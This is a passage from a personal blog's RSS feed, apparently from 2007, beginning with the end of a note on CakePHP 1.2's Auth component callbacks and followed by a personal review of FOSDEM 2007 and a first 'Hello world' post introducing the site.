If we are somewhere else then $loginAction, access is checked at line 293 (function isAuthorized(), function definition at 332.&lt;br /&gt;
Inside this function, $validate is assigned to $type, so it seems like not only &#39;actions&#39; and &#39;objects&#39; are valid values, but also &#39;association&#39; and &#39;controller&#39;.  I don&#39;t really get why this is made so complicated (the __authType() step for example.).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Another callback new in 1.2 is &lt;strong&gt;shutdown(&amp;amp;$controller)&lt;/strong&gt;.  Unlike initialize, this one is mentioned on &lt;a href=&#34;http://cake.insertdesignhere.com/posts/view/17&#34;&gt;Nate&#39;s blog&lt;/a&gt;.  It removes &#39;Auth.redirect&#39; from the session when the user is logged in.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Conclusion&lt;/h3&gt;
&lt;p&gt;This was only a slight introduction, more research (and thus explanations) will happen later on and you can also expect some sample code.  Give me some time though ;-)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Fosdem 2007 review</title>
      <link>http://dieter.plaetinck.be/post/fosdem_2007_review/</link>
      <pubDate>Thu, 15 Mar 2007 21:02:41 -0400</pubDate>
      
      <guid>6 at http://dieter.plaetinck.be</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://www.fosdem.org/2007/&#34;&gt;This years edition&lt;/a&gt; took place in the weekend of 24 - 2 - 2007.  And I was there, for the first time.  Saturday and Sunday :-)&lt;/p&gt;
&lt;p&gt;Like usual the &lt;a href=&#34;http://www.fosdem.org/2007/schedule/days&#34;&gt;schedule&lt;/a&gt; was pretty full, with lots of things happening at the same time, and only one thing a human being is able to attend at the same time.  Luckily however the 2 biggest rooms (Janson and Chavanne) were videotaped and the &lt;a href=&#34;http://www.fosdem.org/2007/media/video&#34;&gt;videos&lt;/a&gt; are always made available online afterwards.  So knowing that, I could safely follow other rooms if I found those more interesting.&lt;/p&gt;
&lt;h3&gt;Saturday&lt;/h3&gt;
&lt;p&gt;The first talk started at 10:00h, and it&#39;s about an hour drive, if you don&#39;t get lost.&lt;br /&gt;
But I need my sleep, especially the sparse kind of sleep after Friday evenings.  (same goes for my buddy &lt;a href=&#34;http://ghosty.be/&#34;&gt;Geert&lt;/a&gt; who I could ride along with).  We headed off at 11h, and arrived somewhere around 12:30.  (Let&#39;s blame Brussels&#39; bad road signaling for that).  &lt;/p&gt;
&lt;p&gt;Missed the opening talks, and the &#34;status of software patents&#34; and &#34;liberating java&#34; talks which I&#39;m was really interested in, but hey they were taped so no problemo ;-). During lunch break I explored the stands a bit, talked with some guys and picked up some reading material.&lt;/p&gt;
&lt;p&gt;At the &lt;a href=&#34;http://www.gentoo.org/&#34;&gt;Gentoo&lt;/a&gt; stand there was no merchandise to be found.  I asked whether merch would arrive, but they said they were afraid not.  (and they were right).  No Gentoo merchandise, that was bummer.  I really wanted a t-shirt or something like that.  Gentoo is one of my favorite distros.&lt;/p&gt;
&lt;p&gt;At the gnome stand they had made a panel were people could write their favorite things (or things they hate) about gnome on post-its.  There were things like &#34;gnome should use QT&#34; replied by &#34;qt should use gtk&#34; and all kinds of jokes.  Then there was this guy who was repositioning all the post-it&#39;s in the shape of letters of kde.  I use neither (I use &lt;a href=&#34;http://www.xfce.org/&#34;&gt;xfce&lt;/a&gt;) but this sure was a cool place to hang out during breaks.  &lt;/p&gt;
&lt;p&gt;After that I followed the &lt;a href=&#34;http://www.fosdem.org/2007/schedule/events/xorg&#34;&gt;X.org talk&lt;/a&gt;, &lt;a href=&#34;http://www.fosdem.org/2007/schedule/speakers/keith+packard&#34;&gt;Keith&lt;/a&gt; (the project leader) was a real-funpants and told us all about the developers involved with Xorg.  Where they live, their tasks, favorite beers, and so on.  More of a talk for the community then the developers.&lt;/p&gt;
&lt;p&gt;Next was &lt;a href=&#34;http://www.fosdem.org/2007/schedule/events/aiglx&#34;&gt;the aiglx one&lt;/a&gt;.  Actually I preferred attending &lt;a href=&#34;http://www.fosdem.org/2007/schedule/events/linuxbios&#34;&gt;linuxBIOS&lt;/a&gt; which I just find more interesting.  Besides, thanks to my nvidia card i can run GLX_EXT_texture_from_pixmap without aiglx or xgl, but hey, I guess the other guys are less fortunate so I decided to stick with them.  I can always check linuxBIOS later :-).   This talk was pretty advanced.  A real developers-talk you could say.  I certainly couldn&#39;t follow ;-)&lt;/p&gt;
&lt;p&gt;After that came a talk about the state of &lt;a href=&#34;http://www.fosdem.org/2007/schedule/events/linux_kernel&#34;&gt; the Linux kernel&lt;/a&gt;.  It was quite interesting, again, this was a talk aimed at developers, which I&#39;m totally not, but I&#39;m a bit familiar with the kernel (running &lt;a href=&#34;http://www.gentoo.org/&#34;&gt;Gentoo&lt;/a&gt; and following &lt;a href=&#34;http://kerneltrap.org/&#34;&gt;kerneltrap&lt;/a&gt; a bit has it advantages) so I could follow, more or less.&lt;/p&gt;
&lt;p&gt;Next I followed &lt;a href=&#34;http://www.fosdem.org/2007/schedule/events/donators_return&#34;&gt;the donators return&lt;/a&gt; thing where people who donated (like me) can &lt;a href=&#34;http://fosdem.org/2007/support/donate&#34;&gt;win prizes&lt;/a&gt;.  I didn&#39;t win anything but hey, still I felt the money was well spent.  (and I also got a free t-shirt ;-) )  One of &lt;a href=&#34;http://www.sun.com/desktop/workstation/ultra20/&#34;&gt;these&lt;/a&gt; would certainly fit in my room though ;-))&lt;/p&gt;
&lt;p&gt;One thing I just had to attend was the Gentoo devroom.  like I said: Gentoo is one of my favorite distributions.  Also, it was our Belgian irc-friend &lt;a href=&#34;http://www.fosdem.org/2007/schedule/speakers/dimitry+bradt&#34;&gt;Dimitry (aka diox)&lt;/a&gt; who gave his talk so I just couldn&#39;t miss &lt;a href=&#34;http://www.fosdem.org/2007/schedule/events/gentoo_future_discussion&#34;&gt;his talk about Gentoo&#39;s future&lt;/a&gt;.  This was the first devroom I followed and it was totally different then any other talk: it was more of an interactive talk between the devs and the audience.  In the audience were some real devs, but also lot&#39;s of &#34;normal&#34; communitypeople.  Next to me there even was a guy who was very new to Gentoo.  I was happy to tell him all about paludis, overlays and other concepts and terms of Gentoo.&lt;/p&gt;
&lt;p&gt;After that, there were no more talks to attend, so I went by some stands again (to check if Gentoo merchandise might have arised, among others), met Geert again and, although it was pretty hard to find our way back in the (now darkened) city of Brussels, we managed to drive back home.&lt;/p&gt;
&lt;h3&gt;Sunday&lt;/h3&gt;
&lt;p&gt;A new day, and wow, so many cool talks to attend: metasploit, drupal, security testing, mozilla, mono, gplv3, the list goes on.  Luckily many of them were in Janson/Chavanne so I could safely skip these and head for...&lt;/p&gt;
&lt;p&gt;the Gentoo devroom.  (yeah, sorry, Gentoo here Gentoo there.  My other favorite distro &lt;a href=&#34;http://www.archlinux.org/&#34;&gt;Arch Linux&lt;/a&gt; wasn&#39;t featured anywhere, so Gentoo got all the attention)&lt;br /&gt;
I missed the &#34;programing with paludis&#34; one (ouch! I would have liked that one) but I was there to hear &lt;a href=&#34;http://www.fosdem.org/2007/schedule/speakers/mike+frysinger&#34;&gt;Mike&lt;/a&gt; talk about &lt;a href=&#34;http://www.fosdem.org/2007/schedule/events/gentoo_council&#34;&gt;Gentoo&#39;s inner workings&lt;/a&gt;.  He told us all about Gentoo&#39;s history and how (by who) the project is managed.  That Daniel (the founder of Gentoo) left and came back (I found it remarkable he didn&#39;t mention &lt;em&gt;why&lt;/em&gt; he left (to work at Microsoft).    Guess that wasn&#39;t important enough for the community)&lt;/p&gt;
&lt;p&gt;After that &lt;a href=&#34;http://www.fosdem.org/2007/schedule/speakers/chris+gianelloni&#34;&gt;Chris&lt;/a&gt; talked about &lt;a href=&#34;http://www.fosdem.org/2007/schedule/events/gentoo_tinderbox_testing&#34;&gt;the process that happens for making releases&lt;/a&gt;.  I was impressed.&lt;/p&gt;
&lt;p&gt;To fill the gap between 13h and 14h I wanted to follow &lt;a href=&#34;http://www.fosdem.org/2007/schedule/events/jabber_oneteam&#34;&gt;this&lt;/a&gt; talk.  I have no idea what oneteam is, but I like jabber.  The room was stuffed with people though, and when opening the door you literally felt warm air coming out, so I decided to let the jabber guys in their oven :-)&lt;/p&gt;
&lt;p&gt;After that some more Gentoo talks: &lt;a href=&#34;http://www.fosdem.org/2007/schedule/events/gentoo_community_distro&#34;&gt;&#34;what makes Gentoo a community based distribution&#34;&lt;/a&gt; by &lt;a href=&#34;http://www.fosdem.org/2007/schedule/speakers/christel+dahlksjaer&#34;&gt;Christel&lt;/a&gt; didn&#39;t make me believe Gentoo is any more community based then most other open source Linux distributions, but hey Christel was quite a joker and the community vibe in the room was nice.&lt;/p&gt;
&lt;p&gt;After that &lt;a href=&#34;http://www.fosdem.org/2007/schedule/speakers/marius+mauch&#34;&gt;Marius&lt;/a&gt; did a &lt;em&gt;great&lt;/em&gt; job explaining the ins and outs of portage -especially the new ones- in his talk &lt;a href=&#34;http://www.fosdem.org/2007/schedule/events/gentoo_portage&#34;&gt;Portage: a look under the surface&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;After that &lt;a href=&#34;http://www.fosdem.org/2007/schedule/speakers/alexander+faeroey&#34;&gt;Alexander&lt;/a&gt; did a talk called &lt;a href=&#34;http://www.fosdem.org/2007/schedule/events/gentoo_bugday&#34;&gt;future of the bugday project&lt;/a&gt;.  This was pretty much the kind of information you get by reading the forums/newsletters.  Nothing new, but I don&#39;t think the talk intended to make groundbreaking revelations either ;-)&lt;/p&gt;
&lt;p&gt;17 &#39;o clock.  Damn.. time went fast.. Fosdem pretty much coming to end, luckily there was another nice topic I was really interested in: &lt;a href=&#34;http://www.fosdem.org/2007/schedule/events/embedded_security_devices&#34;&gt;Linux on embedded security devices&lt;/a&gt;.  This talk wasn&#39;t very good though:   No kernel revelations.  No open source code.  No in-depth explanations.&lt;br /&gt;
Basically a company showing it&#39;s product: an embedded device running Linux, running customized code and a presentation showing a scheme showing where they used technologies like SSL, dns or dhcp.  Boring...  And a little demo.&lt;br /&gt;
Nice to see, but nothing more then that.&lt;/p&gt;
&lt;p&gt;I think it must have been after this talk I went back to the stands to find &lt;a href=&#34;http://christophe.vandeplas.com/&#34;&gt;Christophe (aka chri)&lt;/a&gt;, who I hadn&#39;t met yet but I had helped him a bit getting &lt;a href=&#34;http://code.google.com/p/weids/&#34;&gt;weids, the &#34;Webbased Information Display System&#34;&lt;/a&gt; (which was created for fosdem) to work.&lt;br /&gt;
After talking some time with chri the &lt;a href=&#34;http://www.fsfeurope.org/&#34;&gt;Free Software Foundation: Europe&lt;/a&gt; got my attention, and I couldn&#39;t resist buying one of their lovely t-shirts.  I can&#39;t remember how much it cost me, but it was pretty expensive.  No problem though, as I know the money is in very good hands.&lt;/p&gt;
&lt;p&gt;After that me and Geert drunk a beer, and then drove home again.&lt;/p&gt;
&lt;p&gt;Fosdem was good.&lt;/p&gt;
&lt;h2&gt;Did you know...?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;I invited the &lt;a href=&#34;http://www.cakephp.org/&#34;&gt;CakePHP&lt;/a&gt; guys to come?  Unfortunately none of them came, but maybe I can convince them next year!&lt;/li&gt;
&lt;li&gt;The catering was allright and very, very cheap (and also run by volunteers)&lt;/li&gt;
&lt;li&gt;Fosdem is mentioned in this &lt;a href=&#34;http://www.gentoo.org/news/en/gwn/20070305-newsletter.xml&#34;&gt;Gentoo newsletter&lt;/a&gt;.  Including a picture of all the devs, shot by SeJo (sunday afternoon iirc)&lt;/li&gt;
&lt;li&gt;You&#39;ll find many pictures &lt;a href=&#34;http://www.fosdem.org/2007/media/pictures&#34;&gt;here&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Most of the talks are aimed at developers, and developers certainly are the guys that should come.  Fosdem is the perfect place to meet, discuss (with both developers of your own team, as with devs of other projects that you depend on), learn and hack some code together.&lt;/p&gt;
&lt;p&gt;For the community it&#39;s another story.  Many of the talks are too hard to follow, and those talks that are aimed at the community usually don&#39;t offer more information then what you would find on the websites, forums/mailinglists or newsletters.&lt;br /&gt;
The fact that you can download lots of video material is great.  If you stay home you can still make up for it by watching the movies.&lt;br /&gt;
It&#39;s cool to meet people though.  And if you want to visit stands of different projects (for example to buy merchandise).  That&#39;s imho the best reason for non-developers to come to fosdem.  But that&#39;s personal of course.&lt;/p&gt;
&lt;p&gt;So who&#39;s coming with me to fosdem 2008? :-).&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Hello world!</title>
      <link>http://dieter.plaetinck.be/post/blogpost1_hello_world/</link>
      <pubDate>Sun, 04 Mar 2007 14:45:36 -0400</pubDate>
      
      <guid>1 at http://dieter.plaetinck.be</guid>
      <description>&lt;p&gt;Finally, my own website...&lt;br /&gt;
I already wanted to get this up for a long time.  My initial idea was writing (and styling) it all from scratch using the marvelous &lt;a href=&#34;http://www.cakephp.org&#34;&gt;CakePHP&lt;/a&gt; framework along with an authentication system i wrote, &lt;a href=&#34;http://bakery.cakephp.org/articles/view/147&#34;&gt;dAuth&lt;/a&gt;.&lt;br /&gt;
However, due to my lack of time I decided to use the excellent &lt;a href=&#34;http://www.drupal.org&#34;&gt;drupal&lt;/a&gt; platform, of which I&#39;m quite sure will get the job done equally well, while drastically liberating my time, so I can invest it in other projects :-)&lt;br /&gt;
&lt;a href=&#34;http://buytaert.net/&#34;&gt;Dries Buytaert&lt;/a&gt;&#39;s talk on &lt;a href=&#34;http://www.fosdem.org/2007/&#34;&gt;fosdem&lt;/a&gt; this year really helped on making that decision ;-)&lt;/p&gt;
&lt;p&gt;So, what will this site be about?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;me&lt;/li&gt;
&lt;li&gt;my interests
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://en.wikipedia.org/wiki/FOSS&#34;&gt;Free &amp;amp; Opensource software&lt;/a&gt;, and the thoughts/ideals behind it&lt;/li&gt;
&lt;li&gt;PHP scripting/programming (I like C(++), bash and j2se too but I&#39;m not as good at it as I am at php)&lt;/li&gt;
&lt;li&gt;Audio recording/mixing/production&lt;/li&gt;
&lt;li&gt;Drumming, one of my greatest hobbies&lt;/li&gt;
&lt;li&gt;Music, bands, movies,... I like&lt;/li&gt;
&lt;li&gt;productivity (&lt;a href=&#34;http://en.wikipedia.org/wiki/Test-driven_development&#34;&gt;TDD&lt;/a&gt;, automation scripts, shell/DE tweaks, ...)
&lt;li&gt;ethics and philosophy, these aspects are really important in my life&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.jhsjatoo.org/&#34;&gt;Jeugdhuis SjaTOo&lt;/a&gt;, our local youth club&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now let&#39;s get started ;-)&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
